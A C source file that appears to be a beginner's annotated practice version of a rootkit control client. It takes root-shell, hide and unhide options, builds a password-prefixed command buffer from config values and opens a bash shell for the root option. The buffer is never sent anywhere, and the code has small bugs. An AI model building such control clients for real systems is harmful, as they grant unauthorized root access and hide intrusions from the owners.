#include <stdio.h>
#include <stdlib.h>
#include <getopt.h>
#include <string.h>
#include <fcntl.h>
#include "config.h"


void printHelp(char **argv){
    printf(
            "Usage: %s [OPTION]...\n"
            "\nblah blah blah"
            );
}

void handle_command(int argc, char **argv, int *root, int *hide, int *unhide){
    if (argc < 2) {
        fprintf(stderr, "Error: No arguments provided.\n\n");
        // Does this work???
        printHelp(argv);
        exit(1);
    } else if (argc > 2){
        fprintf(stderr, "Error: Exactly one option should be specified\n\n");
        printHelp(argv);
        exit(1);
    }
    /***
     * If getopt() does not recognize an option character, it prints an error
     * message to stderr, stores the character in optopt, and returns '?'. The
     * calling program may prevent the error message by setting opterr to 0
     ***/

    opterr = 0;

    // Wooow, what's an option
    static struct option long_options[] ={
            {"root-shell", no_argument, 0, 'a'},
            {"hide", no_argument, 0, 'f'},
            {"unhide", no_argument, 0, 'g'},
            {0, 0, 0, 0}
    };

    *root = 0;
    *hide = 0;
    *unhide = 0;

    int opt;
    while ((opt = getopt_long(argc, argv, ":", long_options, NULL)) != -1){
        printf("In the helper command: ");
        switch (opt){
            case 'a':
                *root = 1;
                printf("Root");
                break;
            case 'f':
                printf("hide");
                *hide = 1;
                break;
            case 'g':
                printf("unhide");
                *unhide = 1;
                break;
            case '?':
                fprintf(stderr, "Error: Unrecognised option %s\n\n", argv[optind - 1]);
                printHelp(argv);
                exit(1);
            case ':':
                fprintf(stderr, "Error: Unrecognised option %s\n\n", argv[optind - 1]);
                printHelp(argv);
                exit(1);
        }
    }

}

void write_buffer(char **dest_ptr,  char *src, size_t size){
    printf("\nIn write buffer, dest char is:%zu", dest_ptr);
    // What is memcpy?? It look like memory copy
    memcpy(*dest_ptr, src, size);
    *dest_ptr += size;
    printf("\nNow dest ptr: %zu", dest_ptr);
}

void pointer_example(){
    int i = 25;
    int *ptr = &i;

    printf("The value of i(*ptr):%d", *ptr);
    printf("\nThe address of i(*ptr):%p", ptr);
    printf("\nThe value of i: %d", i);
    printf("\nThe address of i(&i):%p", &i);
    printf("\nThe address of ptr(&ptr):%p", &ptr);
}

int main(int argc, char **argv) {
    int root;
    int hide;
    int unhide;

//    char[10] test = "Iamfive"; // this is 7 characters
//    size_t size = sizeof(test);
//    printf("Size is: %zu", size);


//    printf("\nThe address of root: %p", &root);
//    printf("\nThe address of hide: %p", &hide);
//    printf("\nThe address of unhide: %p", &unhide);

    handle_command(argc, argv, &root, &hide, &unhide);

    size_t buf_size = 0;
    printf("\nInitial size_t: %zu", buf_size);
    buf_size += sizeof(CFG_PASS);
    // Where does the one come from ????
    printf("\nNew size_t: %zu", buf_size);

    if (root) {
        buf_size += sizeof(CFG_ROOT);
        printf("\nRoot size: %zu", buf_size);
    } else if (hide){
        buf_size += sizeof(CFG_HIDE);
        printf("\nHide size: %zu", buf_size);
    } else if (unhide){
        buf_size += sizeof(CFG_UNHIDE);
        printf("\nUnhide size: %zu", buf_size);
    }

    buf_size += 1; // for null terminator
    printf("\nBecause of null: %zu", buf_size);

    // What does malloc do???
    char *buf = malloc(buf_size);
//    printf("\nBuf size: %p", &buf);
    char *buf_ptr = buf;

    write_buffer(&buf_ptr, CFG_PASS, sizeof(CFG_PASS));
    if (root){
        write_buffer(&buf_ptr, CFG_ROOT, sizeof(CFG_ROOT));
    } else if (hide){
        write_buffer(&buf_ptr, CFG_HIDE, sizeof(CFG_HIDE));
    } else if (unhide){
        write_buffer(&buf_ptr, CFG_UNHIDE, sizeof(CFG_UNHIDE));
    }

    if (root) {
        execl("/bin/bash", "bash", NULL);
    }

    return 0;
}